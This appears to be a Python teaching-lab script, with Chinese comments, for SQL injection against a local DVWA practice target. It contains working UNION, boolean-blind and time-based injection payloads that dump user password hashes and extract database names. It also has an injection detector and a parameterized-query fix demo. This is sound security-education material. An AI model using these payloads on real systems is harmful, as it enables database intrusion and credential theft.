#!/usr/bin/env python3
"""13 · SQL 注入全流程：union / 布尔盲注 / 时间盲注 / 五点检测 / 预编译对照

用法:
    python3 sqli_lab.py session                       # 登录 DVWA 并打印 cookie（供 sqlmap）
    python3 sqli_lab.py union                         # low 档 union 注入拖出 users 表
    python3 sqli_lab.py blind                         # 布尔盲注二分提取 database() 名
    python3 sqli_lab.py time                          # 时间盲注：条件 SLEEP 确认 + 提取前两字符
    python3 sqli_lab.py detect                        # 五点迷你检测器（4 注入点 + 1 对照）
    python3 sqli_lab.py fixdemo                       # 预编译修复对照（sqlite 演示）

仅攻击本实验的本地 DVWA 靶场。
"""
import argparse
import re
import sqlite3
import sys
import time
from pathlib import Path

import requests

BASE = "http://127.0.0.1:8080"
ART = Path(__file__).parent / "artifacts"


def login(base=BASE, security="low"):
    """登录 DVWA（admin/password）并把安全等级设为指定档位，返回 Session。"""
    s = requests.Session()
    r = s.get(f"{base}/login.php", timeout=5)
    tok = re.search(r"name='user_token' value='([^']+)'", r.text).group(1)
    s.post(f"{base}/login.php", timeout=5,
           data={"username": "admin", "password": "password",
                 "Login": "Login", "user_token": tok})
    if security:
        r = s.get(f"{base}/security.php", timeout=5)
        tok = re.search(r"name='user_token' value='([^']+)'", r.text).group(1)
        s.post(f"{base}/security.php", timeout=5,
               data={"security": security, "seclev_submit": "Submit", "user_token": tok})
    return s


def sqli_url(base, blind=False):
    page = "sqli_blind" if blind else "sqli"
    return f"{base}/vulnerabilities/{page}/"


def run_union(s, base, payload):
    r = s.get(sqli_url(base), params={"id": payload, "Submit": "Submit"}, timeout=8)
    return r.text


def dump_users(s, base):
    """low 档 union 注入：先定列数，再拖 users 表的 user/password。

    本靶场的报错信号是「空响应」：DVWA 在 SQL 出错时 die()，页面主体不渲染
    （长度 0）——比找错误文本更稳。
    """
    cols = None
    for n in range(1, 6):
        out = run_union(s, base, f"1' ORDER BY {n}#")
        if not out.strip():
            cols = n - 1
            break
    if not cols:
        cols = 5
    print(f"[*] ORDER BY 试探：列数 = {cols}")
    marker = [str(i + 1) for i in range(cols)]
    out = run_union(s, base, f"1' UNION SELECT {','.join(marker)}#")
    shown = [m for m in marker if f"First name: {m}" in out or f"Surname: {m}" in out]
    print(f"[*] UNION SELECT {'/'.join(marker)}：可显位 = {shown}")
    out = run_union(s, base, "0' UNION SELECT user, password FROM users#")
    rows = re.findall(r"First name: (\S+?)<br />Surname: (\S+?)<", out)
    rows = [(u, h) for u, h in rows if u not in ("1", "2")]
    for u, h in rows:
        print(f"[+] {u:<12} {h}")
    print(f"[=] union 注入拖出 {len(rows)} 行（users 表 user/password）")
    return rows


def bool_query(s, base, cond):
    """布尔盲注单次询问：注入条件为真/假时页面是否包含「exists」。"""
    payload = f"1' AND {cond}#"
    out = s.get(sqli_url(base, blind=True),
                params={"id": payload, "Submit": "Submit"}, timeout=8).text
    return "exists" in out and "MISSING" not in out


def blind_extract(s, base, expr, length):
    """对表达式逐字符二分（ASCII 比较）。"""
    result = ""
    for i in range(1, length + 1):
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            if bool_query(s, base, f"ASCII(SUBSTRING({expr},{i},1))>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        result += chr(lo)
    return result


def time_query(s, base, cond, threshold=0.8):
    t0 = time.perf_counter()
    s.get(sqli_url(base, blind=True), params={"id": f"1' AND {cond}#", "Submit": "Submit"},
          timeout=15)
    return time.perf_counter() - t0 > threshold


def cmd_session(_a):
    s = login()
    cookie = "; ".join(f"{k}={v}" for k, v in s.cookies.items())
    print(cookie)
    return 0


def cmd_union(_a):
    s = login()
    rows = dump_users(s, BASE)
    ART.mkdir(exist_ok=True)
    (ART / "users-dump.txt").write_text(
        "\n".join(f"{u}:{h}" for u, h in rows) + "\n", encoding="utf-8")
    return 0 if rows else 1


def cmd_blind(_a):
    s = login()
    t0 = time.perf_counter()
    name = blind_extract(s, BASE, "database()", 4)
    print(f"[blind] 二分提取 database() 前 4 字符：{name}（耗时 {time.perf_counter() - t0:.1f}s）")
    return 0 if name == "dvwa" else 1


def cmd_time(_a):
    s = login()
    base_ok = bool_query(s, BASE, "1=1")
    print(f"[time] 布尔对照：条件 1=1 → {'exists' if base_ok else 'MISSING'}")
    t = time_query(s, BASE, "SLEEP(1.5)=0")
    print(f"[time] 条件 SLEEP(1.5)：{'检测到延迟（>0.8s）' if t else '无延迟'}")
    first = ""
    for c in "dv":
        hit = time_query(s, BASE, f"IF(SUBSTRING(database(),{len(first) + 1},1)='{c}',SLEEP(1.2),0)")
        first += c if hit else "?"
    print(f"[time] 条件延迟提取 database() 前 2 字符：{first}")
    return 0 if t and first == "dv" else 1


POINTS = [
    {"name": "sqli · low", "path": "sqli", "security": "low", "quoted": True, "method": "get"},
    {"name": "sqli · medium", "path": "sqli", "security": "medium", "quoted": False, "method": "post"},
    {"name": "sqli_blind · low", "path": "sqli_blind", "security": "low", "quoted": True, "method": "get"},
    {"name": "sqli_blind · medium", "path": "sqli_blind", "security": "medium", "quoted": False, "method": "post"},
    {"name": "index.php · 对照", "path": None, "security": "low", "quoted": False, "method": "get"},
]


def probe_point(s, base, point):
    """三探针：布尔差异 / 时间延迟。返回 (判定, 证据)。

    注意：DVWA low 档用 GET 提交、medium 档改用 POST——同一漏洞模块的
    传参方式随档位变化，真实世界的接口差异同理。
    """
    if point["path"] is None:                      # 对照点：参数根本没用上
        u = f"{base}/index.php"
        n0 = len(s.get(u, params={"id": "1"}, timeout=8).text)
        n1 = len(s.get(u, params={"id": "1' AND SLEEP(1.5)#"}, timeout=15).text)
        return ("安全" if n0 == n1 else "可疑"), f"两次长度 {n0}/{n1}"
    u = f"{base}/vulnerabilities/{point['path']}/"
    q = point["quoted"]
    t_pay = "1' AND '1'='1" if q else "1 AND 1=1"
    f_pay = "1' AND '1'='2" if q else "1 AND 1=2"
    s_pay = "1' AND SLEEP(1.5)#" if q else "1 AND SLEEP(1.5)"

    def send(payload, timeout=8):
        if point["method"] == "post":
            return s.post(u, data={"id": payload, "Submit": "Submit"}, timeout=timeout)
        return s.get(u, params={"id": payload, "Submit": "Submit"}, timeout=timeout)

    r_t, r_f = send(t_pay), send(f_pay)
    bool_diff = r_t.text != r_f.text
    t0 = time.perf_counter()
    send(s_pay, timeout=15)
    dt = time.perf_counter() - t0
    time_hit = dt > 0.8
    verdict = "存在注入" if (bool_diff or time_hit) else "安全"
    return verdict, f"布尔差异={bool_diff} 时间={dt:.1f}s"


def cmd_detect(_a):
    results = []
    for point in POINTS:
        s = login(security=point["security"])
        verdict, evidence = probe_point(s, BASE, point)
        results.append((point["name"], verdict))
        print(f"[detect] {point['name']:<20} → {verdict}（{evidence}）")
    vuln = sum(1 for _, v in results if v == "存在注入")
    print(f"[=] 判定完成：{vuln} 个注入点 + {len(results) - vuln} 个对照，5 点全部判定")
    return 0 if vuln == 4 else 1


def cmd_fixdemo(_a):
    db = sqlite3.connect(":memory:")
    db.execute("CREATE TABLE users(id INTEGER, name TEXT, secret TEXT)")
    db.executemany("INSERT INTO users VALUES(?,?,?)",
                   [(1, "alice", "alice-secret"), (2, "bob", "bob-secret")])
    payload = "1 OR 1=1"
    unsafe = f"SELECT name, secret FROM users WHERE id = {payload}"
    rows_bad = db.execute(unsafe).fetchall()
    rows_ok = db.execute("SELECT name, secret FROM users WHERE id = ?", ("1 OR 1=1",)).fetchall()
    print(f"[fix] 拼接 SQL：{unsafe}")
    print(f"[fix] 拼接查询结果：{rows_bad} ← 注入生效，拖出全部行")
    print(f"[fix] 预编译（参数化）：id = ? 且参数为字符串 → {rows_ok} ← 注入被当作纯数据")
    return 0 if len(rows_bad) == 2 and len(rows_ok) == 0 else 1


def main():
    ap = argparse.ArgumentParser(description="SQL 注入全流程（仅本机 DVWA 靶场）")
    sub = ap.add_subparsers(dest="cmd", required=True)
    for name, fn in (("session", cmd_session), ("union", cmd_union), ("blind", cmd_blind),
                     ("time", cmd_time), ("detect", cmd_detect), ("fixdemo", cmd_fixdemo)):
        p = sub.add_parser(name)
        p.set_defaults(func=fn)
    args = ap.parse_args()
    return args.func(args)


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n[!] 已中断", file=sys.stderr)
        sys.exit(130)
